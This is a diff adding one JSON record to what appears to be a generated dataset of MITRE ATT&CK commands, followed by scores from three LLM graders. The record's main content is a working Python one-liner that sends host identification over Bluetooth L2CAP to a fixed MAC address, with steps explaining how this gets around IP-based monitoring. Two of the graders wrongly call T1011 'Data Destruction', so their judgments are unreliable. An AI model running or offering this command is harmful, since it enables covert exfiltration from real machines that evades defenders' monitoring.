@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,platform; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('5C:F3:70:12:34:56', 0x1003)); s.sendall(('sys='+str(platform.uname())+'\\n').encode()); s.close()\"",
+  "explanation": "Sends host identification over Bluetooth L2CAP PSM 0x1003, bypassing IP-centric monitoring systems per T1011.",
+  "rationale_steps": [
+    "Pick L2CAP to avoid the main IP-based monitoring plane.",
+    "Use a less-common PSM (0x1003) to reduce service collisions.",
+    "Serialize minimal system info and send over L2CAP.",
+    "Close cleanly to prevent lingering connections."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-d365518a",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced parentheses, proper string formatting, correct socket module usage, and valid syntax for creating and using a Bluetooth socket connection.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command is syntactically correct, it implements exfiltration over Bluetooth (T1011 - Exfiltration Over Other Network Medium) rather than Data Destruction as described in the technique description, showing a fundamental misalignment between the command and the claimed technique.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T01:36:32.777216Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, valid syntax for socket operations, and proper statement separation using semicolons.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data collection/exfiltration (sending host identification over Bluetooth), which is completely unrelated to MITRE ATT&CK T1011 'Data Destruction'.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:36:37.519410Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The python3 -c one-liner is properly quoted, uses valid Python Bluetooth L2CAP socket calls, and has balanced parentheses with correct tuple addressing.",
+        "semantic_score": 4,
+        "semantic_justification": "It opens a Bluetooth L2CAP socket and sends host identification to the specified MAC, aligning with exfiltration over a non-IP channel (T1011), though success depends on Bluetooth hardware/support, pairing/security, and a listener on PSM 0x1003.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-02T01:37:44.227190Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
